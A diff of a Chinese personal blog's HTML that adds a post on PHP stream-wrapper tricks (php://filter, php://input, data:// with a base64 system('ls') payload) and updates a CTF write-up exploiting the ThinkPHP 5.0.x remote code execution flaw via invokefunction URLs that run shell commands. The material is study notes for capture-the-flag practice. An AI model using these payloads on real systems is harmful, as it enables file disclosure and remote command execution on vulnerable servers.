@@ -149,6 +149,73 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://klmn66.github.io/2025/02/12/%E5%B8%B8%E7%94%A8%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%94%A8%E6%B3%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="大奉">
+      <meta itemprop="description" content="大奉的个人博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="大奉">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/02/12/%E5%B8%B8%E7%94%A8%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%94%A8%E6%B3%95/" class="post-title-link" itemprop="url">常用伪协议用法</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-02-12 00:00:00 / 修改时间：19:58:27" itemprop="dateCreated datePublished" datetime="2025-02-12T00:00:00+08:00">2025-02-12</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>常用伪协议用法：</p>
+<ol>
+<li><p>php伪协议<br>用法:（大小写都可以）<br>php://input,用于执行php代码，需要post请求提交数据。<br>php://filter,用于读取源码，get提交参数。?a=php://filter/read=convert.base64/resource=xxx.php<br>需要开启allow_url_fopen:php://input、php://stdin、php://memory、php://temp<br>不需要开启allow_url_fopen:php://filter</p>
+</li>
+<li><p>data协议<br>这是一个输入流执行的协议，它可以向服务器输入数据，而服务器也会执行。常用代码如下：<br>?file=data://text/plain,&lt;?php%20phpinfo();?&gt;<br>用法：<br>data://text/plain,xxxx(要执行的php代码)<br>data://text/plain;base64,xxxx(base64编码后的数据)<br>例：<br>?page=data://text/plain,<br>?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=</p>
+</li>
+<li><p>file协议<br>用法：<br>file://[本地文件系统的绝对路径]<br>想要读取flag.php文件，可以利用filter伪协议，传参如下：<br>?file=php://filter/convert.base64-encode/resource=flag.php</p>
+</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://klmn66.github.io/2025/02/10/php-rce/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -172,10 +239,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2025-02-10 00:00:00 / 修改时间：17:31:50" itemprop="dateCreated datePublished" datetime="2025-02-10T00:00:00+08:00">2025-02-10</time>
+              <time title="创建时间：2025-02-10 00:00:00" itemprop="dateCreated datePublished" datetime="2025-02-10T00:00:00+08:00">2025-02-10</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-02-12 19:00:24" itemprop="dateModified" datetime="2025-02-12T19:00:24+08:00">2025-02-12</time>
+              </span>
 
           
 
@@ -188,7 +261,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>打开题目是以下页面<br><img src="php_rce/1.png" alt=""><br>搜索得知<br><img src="php_rce/屏幕截图 2025-02-10 131649.png" alt=""></p>
+          <p>打开题目是以下页面<br><img src="1.jpeg" alt="图片"><br>搜索得知<br><img src="php_rce/屏幕截图 2025-02-10 131649.png" alt=""></p>
 <p>ThinkPHP 5.0.x-5.1.x 远程代码执行漏洞<br>RCE 远程命令执行，是一种严重的网络安全漏洞。<br>RCE指攻击者能通过网络远程控制目标系统，执行恶意命令，获取敏感信息、控制设备、传播恶意软件等，对系统安全和数据造成极大威胁。<br>容器类的工作由think\Container类完成，但大多数情况我们只需要通过app助手函数或者think\App类即可容器操作，如果在服务类中可以直接调用this-&gt;app进行容器操作。<br>输入<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls</span><br></pre></td></tr></table></figure><br>后是<img src="php_rce/ 屏幕截图 2025-02-10 140602.png" alt=""><br>发现ThinkPHP漏洞为5.0.20版本<br>输入<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls</span><br></pre></td></tr></table></figure><br>后页面为<img src="php_rce/屏幕截图 2025-02-10 140737.png" alt=""><br>查找flag相关的文件，输入<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find / -name &quot;flag&quot;</span><br></pre></td></tr></table></figure><br>后<img src="php_rce/屏幕截图 2025-02-10 141025.png" alt=""><br>然后直接查看/flag<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find / -name &quot;flag&quot;</span><br></pre></td></tr></table></figure><br><img src="php_rce/屏幕截图 2025-02-10 141046.png" alt=""></p>
 
       
@@ -402,7 +475,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-count">4</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
